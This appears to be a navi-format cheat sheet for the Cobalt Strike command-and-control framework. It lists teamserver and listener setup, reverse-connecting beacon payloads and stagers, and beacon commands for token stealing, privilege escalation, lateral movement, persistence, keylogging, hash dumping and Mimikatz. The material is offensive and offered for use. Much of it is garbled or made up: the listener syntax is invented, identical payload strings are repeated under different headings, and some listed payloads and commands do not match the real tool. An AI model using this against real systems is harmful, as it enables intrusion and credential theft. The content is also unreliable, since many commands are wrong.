# Cobalt Strike

% cobaltstrike, cs

#plateform/linux #target/remote #cat/C2 #tag/command-control

## Start Teamserver
#cat/SETUP 
```
./teamserver <external_ip> <password>
```

## Start Client
#cat/SETUP 
```
./cobaltstrike
```

## Generate HTTP Listener
#cat/SETUP 
```
listener http { set Host "<domain_or_ip>"; set Port "<port>"; set BindPort "<port>"; }
```

## Generate HTTPS Listener
#cat/SETUP 
```
listener https { set Host "<domain_or_ip>"; set Port "<port>"; set BindPort "<port>"; set Cert "<certificate_path>"; }
```

## Generate DNS Listener
#cat/SETUP 
```
listener dns { set Host "<domain>"; set Port "<port>"; set BindPort "<port>"; }
```

## Generate SMB Listener
#cat/SETUP 
```
listener smb { set PipeName "<pipe_name>"; }
```

## Generate HTTP Beacon Payload
#cat/PAYLOAD 
```
windows/beacon_http/reverse_http
```

## Generate HTTPS Beacon Payload
#cat/PAYLOAD 
```
windows/beacon_https/reverse_https
```

## Generate DNS Beacon Payload
#cat/PAYLOAD 
```
windows/beacon_dns/reverse_dns
```

## Generate SMB Beacon Payload
#cat/PAYLOAD 
```
windows/beacon_smb/reverse_smb
```

## Generate PowerShell Stager
#cat/PAYLOAD 
```
powershell/beacon_http/reverse_http
```

## Generate PowerShell One-Liner
#cat/PAYLOAD 
```
powershell/beacon_https/reverse_https
```

## Generate Java Applet Stager
#cat/PAYLOAD 
```
java/beacon_http/reverse_http
```

## Generate Windows Executable Stager
#cat/PAYLOAD 
```
windows/beacon_http/reverse_http
```

## Generate DLL Stager
#cat/PAYLOAD 
```
windows/beacon_https/reverse_https
```

## Generate MacOS Payload
#cat/PAYLOAD 
```
osx/beacon_http/reverse_http
```

## Generate Linux Payload
#cat/PAYLOAD 
```
linux/beacon_http/reverse_http
```

## Beacon Commands - Basic
#cat/COMMAND 
```
help                    # Show available commands
sleep <seconds>         # Set beacon sleep time
jobs                    # List running jobs
jobkill <job_id>        # Kill a job
```

## Beacon Commands - System Information
#cat/COMMAND 
```
whoami                 # Current user
hostname               # Target hostname
pwd                    # Current directory
ps                     # List processes
netstat                # Network connections
```

## Beacon Commands - File Operations
#cat/COMMAND 
```
ls <path>              # List directory contents
cd <path>              # Change directory
pwd                     # Print working directory
download <file>         # Download file from target
upload <file>           # Upload file to target
```

## Beacon Commands - Execution
#cat/COMMAND 
```
shell <command>         # Execute command via cmd
execute <command>       # Execute command via CreateProcess
powershell <command>    # Execute PowerShell command
```

## Beacon Commands - Privilege Escalation
#cat/COMMAND 
```
elevate <technique>     # Attempt privilege escalation
runas <user> <command>  # Run command as different user
steal_token <pid>       # Steal token from process
```

## Beacon Commands - Lateral Movement
#cat/COMMAND 
```
psexec <target> <command>    # Execute command on remote system
wmi <target> <command>       # Execute command via WMI
smb <target> <command>       # Execute command via SMB
```

## Beacon Commands - Persistence
#cat/COMMAND 
```
persist <technique>     # Install persistence mechanism
```

## Beacon Commands - Network
#cat/COMMAND 
```
net view                # List network shares
net use                 # List network connections
portscan <target> <ports>  # Scan ports on target
```

## Beacon Commands - Data Exfiltration
#cat/COMMAND 
```
screenshot              # Take screenshot
keylogger <pid>         # Start keylogger on process
hashdump                # Dump password hashes
mimikatz <command>      # Execute Mimikatz command
```
